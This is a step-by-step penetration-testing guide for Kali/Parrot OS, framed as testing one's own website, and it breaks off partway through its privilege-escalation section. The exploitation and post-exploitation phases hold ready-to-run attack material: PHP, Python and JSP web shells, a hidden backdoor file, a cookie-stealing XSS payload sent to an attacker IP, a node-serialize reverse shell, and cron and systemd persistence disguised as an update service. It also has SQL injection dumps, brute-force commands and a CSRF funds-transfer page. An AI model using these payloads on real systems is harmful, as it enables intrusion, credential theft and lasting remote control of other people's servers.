# Complete External Penetration Testing Guide
## Black-Box Testing Your Own Live Website from Kali/Parrot OS

> ⚠️ **CRITICAL LEGAL WARNING**: Only test websites and applications you own or have explicit written permission to test. Unauthorized access is illegal worldwide and can result in criminal prosecution.

---

## Table of Contents
1. [Pre-Engagement & Legal Setup](#pre-engagement--legal-setup)
2. [Environment Setup (Kali/Parrot OS)](#environment-setup)
3. [Phase 1: Reconnaissance & Information Gathering](#phase-1-reconnaissance)
4. [Phase 2: Scanning & Enumeration](#phase-2-scanning--enumeration)
5. [Phase 3: Vulnerability Assessment](#phase-3-vulnerability-assessment)
6. [Phase 4: Exploitation](#phase-4-exploitation)
7. [Phase 5: Post-Exploitation](#phase-5-post-exploitation)
8. [Phase 6: Reporting](#phase-6-reporting)
9. [Advanced Techniques](#advanced-techniques)
10. [Automation Scripts](#automation-scripts)

---

## Pre-Engagement & Legal Setup

### 1. Authorization Documentation

**Create Authorization Letter** (`authorization-letter.txt`):
```
PENETRATION TESTING AUTHORIZATION

I, [Your Name], owner of [Website/Application Name] hosted at 
[Domain/IP Address], hereby authorize myself to conduct security 
testing on this system.

Target Scope:
- Domain: example.com, www.example.com
- IP Range: xxx.xxx.xxx.xxx
- Subdomains: *.example.com
- APIs: api.example.com

Out of Scope:
- Third-party services
- Payment gateways
- External dependencies

Testing Period: [Start Date] to [End Date]

Testing Methods Authorized:
✓ Port scanning
✓ Vulnerability scanning
✓ Web application testing
✓ API testing
✓ DoS testing (limited)

I understand and accept responsibility for all testing activities.

Signature: _________________
Date: _____________________
```

**Save this document and keep it accessible during testing.**

### 2. Rules of Engagement

```bash
# Create ROE document
cat > rules-of-engagement.md << 'EOF'
# Rules of Engagement

## Testing Boundaries
1. Only test production during off-peak hours
2. Stop immediately if system becomes unstable
3. No social engineering of employees
4. No physical security testing
5. Limit DoS testing to 100 requests/second max
6. No data destruction or modification
7. Document everything

## Emergency Contacts
- Your Phone: +XXX-XXX-XXXX
- Emergency Email: security@yourdomain.com

## Backup Plan
- Database backup verified: YES/NO
- Rollback procedure documented: YES/NO
- Incident response plan ready: YES/NO
EOF
```

---

## Environment Setup

### 1. Update Kali/Parrot OS

```bash
# Update system
sudo apt update && sudo apt upgrade -y
sudo apt dist-upgrade -y

# Update all security tools
sudo apt install kali-linux-everything -y  # For Kali
# OR
sudo parrot-upgrade  # For Parrot OS
```

### 2. Essential Tools Installation

```bash
# Web application testing
sudo apt install -y \
    burpsuite \
    zaproxy \
    nikto \
    dirb \
    gobuster \
    wfuzz \
    sqlmap \
    commix \
    wpscan \
    joomscan

# Network scanning
sudo apt install -y \
    nmap \
    masscan \
    netdiscover \
    arp-scan

# Subdomain enumeration
sudo apt install -y \
    sublist3r \
    amass \
    assetfinder \
    subfinder

# SSL/TLS testing
sudo apt install -y \
    sslscan \
    sslyze \
    testssl.sh

# Exploitation frameworks
sudo apt install -y \
    metasploit-framework \
    exploitdb

# Additional tools
sudo apt install -y \
    fierce \
    whatweb \
    wafw00f \
    httprobe \
    nuclei
```

### 3. Install Additional Tools

```bash
# Install Go tools
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/tomnomnom/httprobe@latest
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/OWASP/Amass/v3/...@master

# Add Go bin to PATH
echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc
source ~/.bashrc

# Install Python tools
pip3 install \
    requests \
    beautifulsoup4 \
    selenium \
    paramiko \
    impacket \
    pwntools
```

### 4. Setup Working Directory

```bash
# Create organized workspace
mkdir -p ~/pentest/{recon,scans,exploits,screenshots,reports,wordlists}
cd ~/pentest

# Set target
export TARGET="example.com"
export TARGET_IP="xxx.xxx.xxx.xxx"
echo $TARGET > target.txt

# Create notes file
cat > notes.md << EOF
# Penetration Test - $TARGET
Start Date: $(date)
Tester: $(whoami)

## Timeline
- $(date): Started reconnaissance

## Findings
EOF
```

---

## Phase 1: Reconnaissance

### 1. Passive Information Gathering

**WHOIS Lookup**:
```bash
# Domain information
whois $TARGET | tee recon/whois.txt

# Key information to note:
# - Registrar
# - Registration date
# - Expiration date
# - Name servers
# - Contact information
```

**DNS Enumeration**:
```bash
# Basic DNS records
dig $TARGET ANY +noall +answer | tee recon/dns-records.txt
nslookup $TARGET >> recon/dns-records.txt

# Specific record types
dig $TARGET A | tee -a recon/dns-a-records.txt
dig $TARGET MX | tee -a recon/dns-mx-records.txt
dig $TARGET TXT | tee -a recon/dns-txt-records.txt
dig $TARGET NS | tee -a recon/dns-ns-records.txt

# Reverse DNS
dig -x $TARGET_IP | tee recon/reverse-dns.txt
```

**Subdomain Enumeration**:
```bash
# Method 1: Sublist3r
sublist3r -d $TARGET -o recon/subdomains-sublist3r.txt

# Method 2: Amass (more comprehensive)
amass enum -passive -d $TARGET -o recon/subdomains-amass.txt

# Method 3: Subfinder
subfinder -d $TARGET -o recon/subdomains-subfinder.txt

# Method 4: Assetfinder
assetfinder --subs-only $TARGET | tee recon/subdomains-assetfinder.txt

# Method 5: Certificate transparency
curl -s "https://crt.sh/?q=%.$TARGET&output=json" | \
    jq -r '.[].name_value' | \
    sed 's/\*\.//g' | \
    sort -u | tee recon/subdomains-crt.txt

# Combine all subdomains
cat recon/subdomains-*.txt | sort -u > recon/all-subdomains.txt

# Check which subdomains are alive
cat recon/all-subdomains.txt | httprobe | tee recon/alive-subdomains.txt
```

**Technology Detection**:
```bash
# Detect web technologies
whatweb -v $TARGET | tee recon/technologies.txt

# Wappalyzer alternative (builtwith)
curl -s "https://api.builtwith.com/free1/api.json?KEY=&LOOKUP=$TARGET" | \
    jq '.' | tee recon/builtwith.txt

# Check HTTP headers
curl -I https://$TARGET | tee recon/http-headers.txt

# Detect CMS
# WordPress
wpscan --url https://$TARGET --enumerate ap,at,cb,dbe --api-token YOUR_API_TOKEN

# Joomla
joomscan -u https://$TARGET

# Check for WAF
wafw00f https://$TARGET | tee recon/waf-detection.txt
```

**Email Harvesting**:
```bash
# theHarvester
theHarvester -d $TARGET -b all -l 500 -f recon/emails.html

# Manual search patterns
echo "Common email patterns for $TARGET:"
echo "admin@$TARGET"
echo "support@$TARGET"
echo "info@$TARGET"
echo "security@$TARGET"
```

**Google Dorking**:
```bash
# Create Google dorks file
cat > recon/google-dorks.txt << 'EOF'
site:example.com
site:example.com ext:php
site:example.com ext:asp
site:example.com ext:jsp
site:example.com ext:txt
site:example.com ext:sql
site:example.com ext:log
site:example.com ext:bak
site:example.com inurl:admin
site:example.com inurl:login
site:example.com inurl:upload
site:example.com inurl:backup
site:example.com intitle:"index of"
site:example.com filetype:env
site:example.com filetype:config
site:example.com "API key"
site:example.com "password"
site:example.com "secret"
inurl:example.com inurl:&
inurl:example.com inurl:id=
inurl:example.com inurl:php?=
EOF

# Note: Manually search these on Google
echo "Use these dorks manually in Google to avoid rate limiting"
```

**Wayback Machine**:
```bash
# Check archived versions
curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET/*&output=json&collapse=urlkey" | \
    jq -r '.[] | .[2]' | \
    sort -u | tee recon/wayback-urls.txt

# Find interesting old endpoints
cat recon/wayback-urls.txt | grep -E "(admin|login|upload|config|backup|\.env|\.git)" | \
    tee recon/interesting-old-urls.txt
```

**GitHub/GitLab Reconnaissance**:
```bash
# Search for leaked credentials
# Install gitrob
go install github.com/michenriksen/gitrob@latest

# Search GitHub (manual or use API)
# Look for:
# - Company organization repositories
# - Employee repositories
# - Leaked API keys, passwords
# - Configuration files
# - .env files

# GitHub search examples:
# "example.com" password
# "example.com" api_key
# "example.com" filename:.env
# "example.com" extension:pem private
```

**Social Media Intelligence**:
```bash
# Create OSINT checklist
cat > recon/social-media-osint.md << 'EOF'
# Social Media Intelligence

## LinkedIn
- [ ] Find employees
- [ ] Identify technology stack from job postings
- [ ] Find system administrators
- [ ] Identify security team

## Twitter
- [ ] Company account
- [ ] Employee accounts
- [ ] System status updates
- [ ] Technology mentions

## Job Postings
- [ ] Technologies used
- [ ] Infrastructure details
- [ ] Security tools mentioned
- [ ] Hiring for security positions

## Company Website
- [ ] About page
- [ ] Team members
- [ ] Contact information
- [ ] Privacy policy
- [ ] Terms of service
- [ ] Security policy
EOF
```

### 2. Create Reconnaissance Summary

```bash
# Generate recon report
cat > recon/recon-summary.md << EOF
# Reconnaissance Summary - $TARGET

## Basic Information
- Target Domain: $TARGET
- Target IP: $TARGET_IP
- Date: $(date)

## Subdomains Found
$(cat recon/all-subdomains.txt | wc -l) subdomains discovered
$(cat recon/alive-subdomains.txt | wc -l) subdomains alive

## Technologies Detected
$(cat recon/technologies.txt | head -20)

## DNS Records
$(cat recon/dns-records.txt)

## WAF Detection
$(cat recon/waf-detection.txt)

## Next Steps
- [ ] Port scanning
- [ ] Web application scanning
- [ ] Vulnerability assessment
- [ ] Manual testing
EOF

cat recon/recon-summary.md
```

---

## Phase 2: Scanning & Enumeration

### 1. Port Scanning

**Quick Scan**:
```bash
# Fast TCP scan of common ports
nmap -sS -T4 -p- --open $TARGET_IP -oA scans/quick-tcp-scan

# UDP scan (slower)
sudo nmap -sU -T4 --top-ports 100 $TARGET_IP -oA scans/quick-udp-scan
```

**Comprehensive Scan**:
```bash
# Full TCP scan with service detection
sudo nmap -sS -sV -sC -A -p- $TARGET_IP -oA scans/full-tcp-scan

# Aggressive scan
sudo nmap -A -T4 -p- $TARGET_IP -oA scans/aggressive-scan

# Script scan for vulnerabilities
sudo nmap -sV --script=vuln $TARGET_IP -oA scans/vuln-scan
```

**Masscan (Ultra Fast)**:
```bash
# Scan all ports quickly
sudo masscan -p1-65535 $TARGET_IP --rate=10000 -oL scans/masscan-results.txt

# Convert to Nmap-friendly format
awk '{print $4}' scans/masscan-results.txt | \
    sort -u | \
    tr '\n' ',' | \
    sed 's/,$//' > scans/open-ports.txt

# Detailed scan of discovered ports
sudo nmap -sS -sV -sC -p$(cat scans/open-ports.txt) $TARGET_IP \
    -oA scans/detailed-open-ports
```

**Analyze Scan Results**:
```bash
# Parse Nmap results
cat > scripts/parse-nmap.sh << 'EOF'
#!/bin/bash
echo "=== Open Ports Summary ==="
grep "^[0-9]" scans/full-tcp-scan.nmap | grep "open" | cut -d'/' -f1 | sort -n

echo -e "\n=== Web Services ==="
grep -E "(80|443|8080|8443)" scans/full-tcp-scan.nmap

echo -e "\n=== Database Services ==="
grep -E "(3306|5432|27017|6379)" scans/full-tcp-scan.nmap

echo -e "\n=== SSH/FTP Services ==="
grep -E "(22|21)" scans/full-tcp-scan.nmap

echo -e "\n=== Potential Vulnerabilities ==="
grep -i "vuln" scans/vuln-scan.nmap
EOF

chmod +x scripts/parse-nmap.sh
./scripts/parse-nmap.sh | tee scans/port-summary.txt
```

### 2. Web Server Enumeration

**Directory Brute-forcing**:
```bash
# Using Gobuster (Fast)
gobuster dir -u https://$TARGET \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -t 50 \
    -x php,html,txt,js,json,xml,bak,old,zip \
    -o scans/gobuster-results.txt \
    -b 404,403 \
    --timeout 30s

# Using Dirb
dirb https://$TARGET \
    /usr/share/wordlists/dirb/big.txt \
    -o scans/dirb-results.txt

# Using Feroxbuster (Recursive)
feroxbuster -u https://$TARGET \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -t 100 \
    -d 3 \
    -o scans/feroxbuster-results.txt

# Using WFUZZ
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
    --hc 404 \
    https://$TARGET/FUZZ \
    | tee scans/wfuzz-results.txt
```

**API Endpoint Discovery**:
```bash
# Common API paths
cat > wordlists/api-endpoints.txt << 'EOF'
/api
/api/v1
/api/v2
/v1
/v2
/rest
/graphql
/swagger
/api-docs
/docs
/documentation
/openapi.json
/swagger.json
/api/swagger
/api/docs
/api/graphql
EOF

# Fuzz API endpoints
gobuster dir -u https://$TARGET \
    -w wordlists/api-endpoints.txt \
    -t 20 \
    -o scans/api-endpoints.txt

# Test discovered APIs
for endpoint in $(cat scans/api-endpoints.txt | grep "Status: 200" | awk '{print $1}'); do
    echo "Testing: $endpoint"
    curl -s "https://$TARGET$endpoint" | jq '.' 2>/dev/null || cat
    echo "---"
done | tee scans/api-responses.txt
```

**Parameter Fuzzing**:
```bash
# Common parameter names
cat > wordlists/parameters.txt << 'EOF'
id
user
admin
debug
test
file
page
url
path
redirect
callback
return
continue
dest
destination
view
template
email
username
password
token
api_key
key
EOF

# Fuzz GET parameters
wfuzz -c -z file,wordlists/parameters.txt \
    --hc 404 \
    "https://$TARGET/page?FUZZ=test" \
    | tee scans/parameter-fuzz.txt
```

**Technology Fingerprinting**:
```bash
# Detailed HTTP headers
curl -I -L https://$TARGET | tee scans/headers-detailed.txt

# Server information
curl -s -D - https://$TARGET -o /dev/null | grep -i server

# Check for common files
for file in robots.txt sitemap.xml crossdomain.xml security.txt .well-known/security.txt humans.txt; do
    echo "Checking: $file"
    curl -s "https://$TARGET/$file" -o "scans/$file" && \
        echo "Found: $file" || echo "Not found: $file"
done

# Check for .git exposure
curl -s "https://$TARGET/.git/HEAD" | tee scans/git-exposure.txt
if [ -s scans/git-exposure.txt ]; then
    echo "⚠️ WARNING: .git directory exposed!"
fi
```

### 3. SSL/TLS Analysis

```bash
# Comprehensive SSL test
testssl.sh https://$TARGET | tee scans/ssl-test.txt

# SSLScan
sslscan $TARGET | tee scans/sslscan.txt

# SSLyze
sslyze --regular $TARGET | tee scans/sslyze.txt

# Check certificate details
openssl s_client -connect $TARGET:443 -showcerts < /dev/null 2>&1 | \
    openssl x509 -noout -text | tee scans/certificate.txt

# Test for common vulnerabilities
echo "Testing SSL/TLS vulnerabilities..."
echo "1. Heartbleed"
nmap -p 443 --script ssl-heartbleed $TARGET

echo "2. POODLE"
nmap -p 443 --script ssl-poodle $TARGET

echo "3. BEAST"
nmap -p 443 --script ssl-enum-ciphers $TARGET
```

### 4. Email Security Testing

```bash
# SPF record
dig TXT $TARGET | grep "v=spf" | tee scans/spf-record.txt

# DMARC record
dig TXT _dmarc.$TARGET | tee scans/dmarc-record.txt

# DKIM record (common selectors)
for selector in default google k1 s1 s2 selector1 selector2; do
    dig TXT $selector._domainkey.$TARGET | grep -v "^;" | grep "v=DKIM"
done | tee scans/dkim-records.txt

# MX records
dig MX $TARGET | tee scans/mx-records.txt

# Test for open relay
cat > scripts/test-smtp.sh << 'EOF'
#!/bin/bash
MX_SERVERS=$(dig +short MX $TARGET | awk '{print $2}')
for server in $MX_SERVERS; do
    echo "Testing $server for open relay..."
    nmap -p 25 --script smtp-open-relay $server
done
EOF

chmod +x scripts/test-smtp.sh
./scripts/test-smtp.sh | tee scans/smtp-test.txt
```

---

## Phase 3: Vulnerability Assessment

### 1. Automated Web Vulnerability Scanning

**OWASP ZAP Automated Scan**:
```bash
# Start ZAP in daemon mode
zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.disablekey=true &
sleep 10

# Spider the target
curl "http://localhost:8080/JSON/spider/action/scan/?url=https://$TARGET"

# Wait for spider to complete
while [ $(curl -s "http://localhost:8080/JSON/spider/view/status/" | jq -r '.status') != "100" ]; do
    echo "Spidering in progress..."
    sleep 5
done

# Active scan
curl "http://localhost:8080/JSON/ascan/action/scan/?url=https://$TARGET"

# Wait for scan to complete
while [ $(curl -s "http://localhost:8080/JSON/ascan/view/status/" | jq -r '.status') != "100" ]; do
    echo "Scanning in progress..."
    sleep 10
done

# Generate report
curl "http://localhost:8080/OTHER/core/other/htmlreport/" > scans/zap-report.html

# Stop ZAP
killall java
```

**Nikto Web Scanner**:
```bash
# Basic scan
nikto -h https://$TARGET -o scans/nikto-basic.txt

# Comprehensive scan
nikto -h https://$TARGET \
    -Tuning 123456789abc \
    -Format htm \
    -output scans/nikto-comprehensive.html

# Scan all discovered subdomains
for subdomain in $(cat recon/alive-subdomains.txt); do
    echo "Scanning: $subdomain"
    nikto -h $subdomain -o "scans/nikto-$(echo $subdomain | tr '/' '-').txt"
done
```

**Nuclei Scanner**:
```bash
# Update templates
nuclei -update-templates

# Full scan with all templates
nuclei -u https://$TARGET \
    -t ~/nuclei-templates/ \
    -severity critical,high,medium \
    -o scans/nuclei-results.txt

# Specific vulnerability types
nuclei -u https://$TARGET -t ~/nuclei-templates/cves/ -o scans/nuclei-cves.txt
nuclei -u https://$TARGET -t ~/nuclei-templates/vulnerabilities/ -o scans/nuclei-vulns.txt
nuclei -u https://$TARGET -t ~/nuclei-templates/exposures/ -o scans/nuclei-exposures.txt
nuclei -u https://$TARGET -t ~/nuclei-templates/misconfiguration/ -o scans/nuclei-misconfig.txt

# Scan all subdomains
cat recon/alive-subdomains.txt | nuclei \
    -t ~/nuclei-templates/ \
    -severity critical,high \
    -o scans/nuclei-all-subdomains.txt
```

### 2. Manual Vulnerability Testing

**SQL Injection Testing**:
```bash
# SQLMap automated testing
# Test a vulnerable parameter
sqlmap -u "https://$TARGET/page?id=1" \
    --batch \
    --level=5 \
    --risk=3 \
    --random-agent \
    -o scans/sqlmap-results/

# Test with POST data
sqlmap -u "https://$TARGET/login" \
    --data="username=admin&password=test" \
    --batch \
    --level=3 \
    --risk=2 \
    -o scans/sqlmap-login/

# Test all parameters
sqlmap -u "https://$TARGET/search?q=test&category=all" \
    --batch \
    --crawl=2 \
    --level=3 \
    --risk=2 \
    -o scans/sqlmap-crawl/

# If database found, enumerate
sqlmap -u "https://$TARGET/page?id=1" \
    --batch \
    --dbs \
    --tables \
    --columns \
    -D database_name \
    -T users \
    --dump
```

**XSS Testing**:
```bash
# Create XSS payload list
cat > wordlists/xss-payloads.txt << 'EOF'
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
'"><script>alert('XSS')</script>
javascript:alert('XSS')
\x3cscript\x3ealert('XSS')\x3c/script\x3e
<scr<script>ipt>alert('XSS')</scr</script>ipt>
EOF

# Test with WFUZZ
wfuzz -c -z file,wordlists/xss-payloads.txt \
    --hs "not found" \
    "https://$TARGET/search?q=FUZZ" \
    | tee scans/xss-fuzz-results.txt

# Use XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt
python3 xsstrike.py -u "https://$TARGET/search?q=test" --crawl
cd ..
```

**Command Injection Testing**:
```bash
# Commix tool
commix --url="https://$TARGET/page?cmd=test" \
    --level=3 \
    --batch \
    -o scans/commix-results.txt

# Manual payloads
cat > wordlists/command-injection.txt << 'EOF'
;ls
|ls
`ls`
$(ls)
;cat /etc/passwd
|cat /etc/passwd
;whoami
|whoami
;id
|id
&& ls
|| ls
; sleep 10
| sleep 10
`sleep 10`
$(sleep 10)
EOF

# Test with curl
for payload in $(cat wordlists/command-injection.txt); do
    echo "Testing: $payload"
    time curl -s "https://$TARGET/page?cmd=$payload" -o /dev/null
done
```

**File Upload Testing**:
```bash
# Create test files
# PHP shell
echo '<?php system($_GET["cmd"]); ?>' > exploits/shell.php

# Double extension
cp exploits/shell.php exploits/shell.php.jpg

# Null byte
cp exploits/shell.php exploits/shell.php%00.jpg

# SVG with XSS
cat > exploits/xss.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
EOF

# Test upload
curl -X POST -F "file=@exploits/shell.php" https://$TARGET/upload

# Test with different extensions
for ext in php php3 php4 php5 phtml phar; do
    cp exploits/shell.php "exploits/shell.$ext"
    curl -X POST -F "file=@exploits/shell.$ext" https://$TARGET/upload
done
```

**SSRF Testing**:
```bash
# SSRF payload list
cat > wordlists/ssrf-payloads.txt << 'EOF'
http://localhost
http://127.0.0.1
http://127.1
http://0177.0.0.1
http://0x7f.0x0.0x0.0x1
http://[::1]
http://localhost:22
http://localhost:3306
http://localhost:5432
http://localhost:6379
http://localhost:27017
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
EOF

# Test SSRF
for payload in $(cat wordlists/ssrf-payloads.txt); do
    echo "Testing: $payload"
    curl -s "https://$TARGET/fetch?url=$payload" | head -20
    echo "---"
done | tee scans/ssrf-test-results.txt
```

### 3. Authentication Testing

**Brute Force Attack**:
```bash
# Hydra - HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    $TARGET http-post-form \
    "/login:username=^USER^&password=^PASS^:F=incorrect" \
    -t 10 \
    -w 30 \
    -o scans/hydra-results.txt

# Medusa
medusa -h $TARGET -u admin \
    -P /usr/share/wordlists/rockyou.txt \
    -M http \
    -m DIR:/login \
    -T 10 \
    -O scans/medusa-results.txt

# Patator
patator http_fuzz \
    url=https://$TARGET/login \
    method=POST \
    body='username=FILE0&password=FILE1' \
    0=/usr/share/wordlists/usernames.txt \
    1=/usr/share/wordlists/passwords.txt \
    -x ignore:fgrep='incorrect' \
    -l scans/patator-results.txt
```

**Password Reset Testing**:
```bash
# Test for user enumeration
curl -X POST https://$TARGET/reset-password \
    -d "email=existing@user.com" \
    | tee scans/reset-existing.txt

curl -X POST https://$TARGET/reset-password \
    -d "email=nonexisting@user.com" \
    | tee scans/reset-nonexisting.txt

# Compare responses
diff scans/reset-existing.txt scans/reset-nonexisting.txt

# Test for weak tokens
# Request multiple resets and analyze token pattern
for i in {1..10}; do
    curl -X POST https://$TARGET/reset-password \
        -d "email=test@test.com" \
        -i | grep -i "token" | tee -a scans/reset-tokens.txt
    sleep 2
done

# Analyze token entropy
cat scans/reset-tokens.txt
```

---

## Phase 4: Exploitation

### 1. Exploit Known Vulnerabilities

**Using Metasploit**:
```bash
# Start Metasploit
msfconsole

# Search for exploits
msf6 > search $TARGET
msf6 > search type:exploit platform:linux

# Example: Exploiting a known CVE
msf6 > use exploit/multi/http/apache_struts_rce
msf6 > set RHOSTS $TARGET_IP
msf6 > set RPORT 8080
msf6 > set TARGETURI /struts2-showcase
msf6 > exploit

# Or use from command line
msfconsole -q -x "use exploit/multi/http/apache_struts_rce; \
    set RHOSTS $TARGET_IP; \
    set RPORT 8080; \
    exploit"
```

**SearchSploit**:
```bash
# Search for exploits
searchsploit apache 2.4.49
searchsploit wordpress
searchsploit node.js

# Copy exploit
searchsploit -m 12345.py

# Execute exploit
python 12345.py $TARGET_IP
```

### 2. Web Shell Upload

**If file upload vulnerability found**:
```bash
# PHP web shell
cat > exploits/webshell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>
EOF

# Python web shell (for Python apps)
cat > exploits/webshell.py << 'EOF'
import os
from flask import Flask, request
app = Flask(__name__)

@app.route('/shell')
def shell():
    cmd = request.args.get('cmd', '')
    return os.popen(cmd).read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
EOF

# JSP web shell (for Java apps)
cat > exploits/webshell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        byte[] buf = new byte[8192];
        int len;
        while ((len = in.read(buf)) != -1) {
            out.write(buf, 0, len);
        }
    }
%>
EOF

# Upload shell
curl -X POST -F "file=@exploits/webshell.php" https://$TARGET/upload

# Access shell
curl "https://$TARGET/uploads/webshell.php?cmd=whoami"
curl "https://$TARGET/uploads/webshell.php?cmd=id"
curl "https://$TARGET/uploads/webshell.php?cmd=uname+-a"
```

### 3. SQL Injection Exploitation

**Manual SQL injection**:
```bash
# Test for SQLi
curl "https://$TARGET/page?id=1'" | grep -i error
curl "https://$TARGET/page?id=1 AND 1=1--" 
curl "https://$TARGET/page?id=1 AND 1=2--"

# Extract database name
curl "https://$TARGET/page?id=1 UNION SELECT database()--"

# Extract tables
curl "https://$TARGET/page?id=1 UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--"

# Extract columns
curl "https://$TARGET/page?id=1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--"

# Extract data
curl "https://$TARGET/page?id=1 UNION SELECT username,password FROM users--"
```

**Using SQLMap for exploitation**:
```bash
# Get database names
sqlmap -u "https://$TARGET/page?id=1" --dbs --batch

# Get tables from specific database
sqlmap -u "https://$TARGET/page?id=1" -D database_name --tables --batch

# Dump specific table
sqlmap -u "https://$TARGET/page?id=1" \
    -D database_name \
    -T users \
    --dump \
    --batch

# Get shell (if possible)
sqlmap -u "https://$TARGET/page?id=1" --os-shell --batch

# Read files
sqlmap -u "https://$TARGET/page?id=1" \
    --file-read="/etc/passwd" \
    --batch

# Write files (web shell)
sqlmap -u "https://$TARGET/page?id=1" \
    --file-write="exploits/webshell.php" \
    --file-dest="/var/www/html/shell.php" \
    --batch
```

### 4. XSS Exploitation

**Steal Cookies**:
```bash
# Setup listener
nc -lvnp 4444

# XSS payload to steal cookies
<script>document.location='http://YOUR_IP:4444/?c='+document.cookie</script>

# URL encoded
%3Cscript%3Edocument.location%3D%27http%3A%2F%2FYOUR_IP%3A4444%2F%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E

# Inject via vulnerable parameter
curl "https://$TARGET/page?comment=%3Cscript%3Edocument.location%3D%27http%3A%2F%2FYOUR_IP%3A4444%2F%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E"
```

**BeEF Framework**:
```bash
# Start BeEF
beef-xss

# Default credentials: beef:beef
# Access at: http://127.0.0.1:3000/ui/panel

# Inject hook
<script src="http://YOUR_IP:3000/hook.js"></script>

# Once victim loads page, control from BeEF panel
```

### 5. CSRF Exploitation

**Create CSRF PoC**:
```html
<!-- csrf-poc.html -->
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Test</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    
    <!-- Auto-submit form -->
    <form id="csrf-form" action="https://example.com/api/delete-account" method="POST">
        <input type="hidden" name="confirm" value="yes">
    </form>
    
    <script>
        document.getElementById('csrf-form').submit();
    </script>
    
    <!-- Or using fetch -->
    <script>
        fetch('https://example.com/api/transfer', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                to: 'attacker@evil.com',
                amount: 1000
            })
        });
    </script>
</body>
</html>
```

### 6. Remote Code Execution

**Node.js Deserialization Attack**:
```javascript
// If app uses node-serialize or similar
const serialize = require('node-serialize');

// Malicious payload
const payload = {
    rce: "_$ND_FUNC$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"', function(error, stdout, stderr) { console.log(stdout) });}()"
};

// Serialize
const serialized = serialize.serialize(payload);

// Send to vulnerable endpoint
curl -X POST https://$TARGET/api/data \
    -H "Content-Type: application/json" \
    -d "$serialized"
```

**Template Injection**:
```bash
# SSTI payloads for different engines

# Jinja2 (Python)
{{7*7}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Handlebars (JavaScript)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

# Test each payload
for payload in "{{7*7}}" "{{config}}" "{{''.__class__}}"; do
    echo "Testing: $payload"
    curl "https://$TARGET/template?name=$payload"
done
```

---

## Phase 5: Post-Exploitation

### 1. Maintain Access

**Create Backdoor**:
```bash
# PHP backdoor
cat > exploits/backdoor.php << 'EOF'
<?php
$password = 'secret123';
if(isset($_POST['auth']) && $_POST['auth'] == $password){
    if(isset($_POST['cmd'])){
        echo '<pre>' . shell_exec($_POST['cmd']) . '</pre>';
    }
}
?>
EOF

# Upload to hidden location
curl -X POST -F "file=@exploits/backdoor.php" \
    https://$TARGET/upload/temp/.config.php
```

**Persistence Mechanisms**:
```bash
# Add SSH key (if SSH access gained)
mkdir -p ~/.ssh
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Cron job
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" | crontab -

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update.service
systemctl start update.service
```

### 2. Privilege Escalation

**Linux Privilege Escalation**:
```bash
# Download LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

# Run on target
./linpeas.sh | tee priv-esc-scan.txt

# Manual checks
sudo -l
cat /etc/crontab
cat /etc/passwd
cat /etc/shadow
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
```

**Check for Common Misconfigurations**:
```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd

# Docker escape (if in container)
